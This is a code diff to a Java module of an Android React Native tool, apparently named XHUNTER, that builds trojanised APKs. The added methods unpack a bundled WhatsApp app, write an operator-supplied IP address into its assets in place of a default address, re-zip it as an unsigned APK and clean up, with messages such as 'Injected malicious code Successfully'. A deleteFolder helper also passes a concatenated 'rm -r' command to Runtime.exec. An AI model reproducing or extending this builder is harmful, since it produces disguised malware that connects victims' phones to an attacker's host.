@@ -41,6 +41,7 @@ import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.FileReader;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -54,10 +55,14 @@ import java.security.NoSuchProviderException;
 import java.security.Security;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.List;
 import java.util.regex.Pattern;
 import java.util.zip.DataFormatException;
 import java.util.zip.Inflater;
 import java.util.zip.InflaterInputStream;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipInputStream;
+import java.util.zip.ZipOutputStream;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
@@ -74,8 +79,9 @@ import org.spongycastle.jce.provider.BouncyCastleProvider; // Android
 
 public class AppBuilderModule extends ReactContextBaseJavaModule {
     private final ReactApplicationContext reactContext;
-    private final String working_dir= Environment.getExternalStorageDirectory().getPath()+"/XHUNTER/";
+    private final String working_dir= Environment.getExternalStorageDirectory().getPath()+"/XHUNTER/payload/";
     private final String payload_name="payload.apk";
+    List<String> filesListInDir = new ArrayList<String>();
     AppBuilderModule(ReactApplicationContext context) {
         super(context);
         this.reactContext = context;
@@ -215,12 +221,16 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
                 copyAssets(payload_name,workingDirectory);
                 copyAssets("test.pem",workingDirectory);
                 copyAssets("test.pk8",workingDirectory);
+                copyAssets("ip.txt",workingDirectory);
+                copyAssets("WhatsApp.zip",workingDirectory);
                 promise.resolve(params);
             }else{
                 if(workingDirectory.mkdirs()){
                     copyAssets(payload_name,workingDirectory);
                     copyAssets("test.pem",workingDirectory);
                     copyAssets("test.pk8",workingDirectory);
+                    copyAssets("ip.txt",workingDirectory);
+                    copyAssets("WhatsApp.zip",workingDirectory);
                     promise.resolve(params);
                 }else{
                     promise.reject("e","[!] Failed to create working directory");
@@ -230,6 +240,68 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
             e.printStackTrace();
             promise.reject("e","[!] Loading  Resources Failed!");
         }
+    }
+    @ReactMethod
+    public void unzip( Promise promise) throws IOException {
+        ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(working_dir+"WhatsApp.zip")));
+        WritableMap params = Arguments.createMap();
+        params.putString("message", "[+] Unziped Resources Successfully!");
+        try {
+            ZipEntry ze;
+            int count;
+            byte[] buffer = new byte[8192];
+            while ((ze = zis.getNextEntry()) != null) {
+                File file = new File(working_dir+"normal_apk", ze.getName());
+                File dir = ze.isDirectory() ? file : file.getParentFile();
+                if (!dir.isDirectory() && !dir.mkdirs())
+                    throw new FileNotFoundException("Failed to ensure directory: " +
+                            dir.getAbsolutePath());
+                if (ze.isDirectory())
+                    continue;
+                FileOutputStream fout = new FileOutputStream(file);
+                try {
+                    while ((count = zis.read(buffer)) != -1)
+                        fout.write(buffer, 0, count);
+                } finally {
+                    fout.close();
+                }
+            }
+        }catch (SecurityException e){
+            e.printStackTrace();
+            promise.reject("e","[!] Unziping  Resources Failed!");
+        }
+        finally {
+            zis.close();
+            promise.resolve(params);
+        }
+    }
+    @ReactMethod
+    public void edit_app(String ip, Promise promise){
+        WritableMap params = Arguments.createMap();
+        params.putString("message", "[+] Injected malicious code Successfully!");
+        String fileName = working_dir+"ip.txt";
+        File file = new File(fileName);
+        FileReader fr = null;
+        String line;
+        try {
+            fr = new FileReader(file);
+            BufferedReader br = new BufferedReader(fr);
+            FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
+            while((line=br.readLine()) != null){
+                fw.write(line.replaceAll("192.168.43.1",ip));
+            }//loop
+            fw.close();
+            promise.resolve(params);
+        } catch ( IOException e) {
+            e.printStackTrace();
+            promise.reject("e","[!] Injecting malicious code Failed!");
+        }
+    }
+    @ReactMethod
+    public void zip(Promise promise) {
+        File dir = new File(working_dir+"normal_apk");
+        String zipDirName = working_dir+"unsigned.apk";
+        zipDirectory(dir, zipDirName,promise);
     }
     @ReactMethod
     public void decompile_payload(Promise promise) {
@@ -331,8 +403,12 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
         WritableMap params = Arguments.createMap();
         params.putString("message", "[+] Done !!");
         try {
+            deleteFolder(working_dir+"normal_apk");
+            deleteFolder(working_dir+"payload");
             deleteFile(working_dir+payload_name);
+            deleteFile(working_dir+"WhatsApp.zip");
             deleteFile(working_dir+"unsigned.apk");
+            deleteFile(working_dir+"ip.txt");
             deleteFile(working_dir+"test.pk8");
             deleteFile(working_dir+"test.pem");
             promise.resolve(params);
@@ -463,6 +539,16 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
             }
         }
     }
+    private void deleteFolder(String path){
+        File dir = new File(path);
+        if (dir.exists()) {
+            String deleteCmd = "rm -r " + path;
+            Runtime runtime = Runtime.getRuntime();
+            try {
+                runtime.exec(deleteCmd);
+            } catch (IOException e) { }
+        }
+    }
     private void moveDir(String source, String destination) throws IOException{
             if(!(new File(destination).exists())){
                 FileUtils.moveDirectory(new File(source), new File(destination));
@@ -488,5 +574,44 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
             }
         }
     }
+    private void zipDirectory(File dir, String zipDirName,Promise promise) {
+        WritableMap params = Arguments.createMap();
+        params.putString("message", "[+] Ziped Resources Successfully!");
+        try {
+            populateFilesList(dir);
+            //now zip files one by one
+            //create ZipOutputStream to write to the zip file
+            FileOutputStream fos = new FileOutputStream(zipDirName);
+            ZipOutputStream zos = new ZipOutputStream(fos);
+            for(String filePath : filesListInDir){
+                //for ZipEntry we need to keep only relative file path, so we used substring on absolute path
+                ZipEntry ze = new ZipEntry(filePath.substring(dir.getAbsolutePath().length()+1, filePath.length()));
+                zos.putNextEntry(ze);
+                //read the file and write to ZipOutputStream
+                FileInputStream fis = new FileInputStream(filePath);
+                byte[] buffer = new byte[1024];
+                int len;
+                while ((len = fis.read(buffer)) > 0) {
+                    zos.write(buffer, 0, len);
+                }
+                zos.closeEntry();
+                fis.close();
+            }
+            zos.close();
+            fos.close();
+            promise.resolve(params);
+        } catch (IOException e) {
+            e.printStackTrace();
+            promise.reject("e","[!] Ziping  Resources Failed!");
+        }
+    }
+    private void populateFilesList(File dir) throws IOException {
+        File[] files = dir.listFiles();
+        for(File file : files){
+            if(file.isFile()) filesListInDir.add(file.getAbsolutePath());
+            else populateFilesList(file);
+        }
+    }
+
 
 }
